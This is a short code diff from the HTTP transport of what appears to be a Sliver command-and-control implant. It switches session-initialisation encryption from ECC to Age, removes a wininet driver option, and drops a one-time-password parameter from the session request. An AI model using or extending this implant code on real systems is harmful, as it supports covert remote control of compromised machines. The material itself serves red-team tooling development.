@@ -46,8 +46,7 @@ import (
 )
 
 var (
-	wininetDriver = "wininet"
-	goHTTPDriver  = "go"
+	goHTTPDriver = "go"
 
 	userAgent      = "{{GenerateUserAgent}}"
 	nonceQueryArgs = "{{.HTTPC2ImplantConfig.NonceQueryArgs}}" // "abcdefghijklmnopqrstuvwxyz"
@@ -179,7 +178,7 @@ func (s *SliverHTTPClient) SessionInit() error {
 	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
 
-	encryptedSessionInit, err := cryptography.ECCEncryptToServer(data)
+	encryptedSessionInit, err := cryptography.AgeEncryptToServer(data)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Nacl encrypt failed %v", err)
@@ -360,9 +359,7 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 
 	uri := s.startSessionURL()
 	s.NonceQueryArgument(uri, nonce)
-	timestamp := time.Now().UTC().Add(TimeDelta)
-	otpCode := cryptography.GetExactOTPCode(timestamp)
-	s.OTPQueryArgument(uri, otpCode)
+
 	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s (%d bytes)", uri, len(sessionInit))
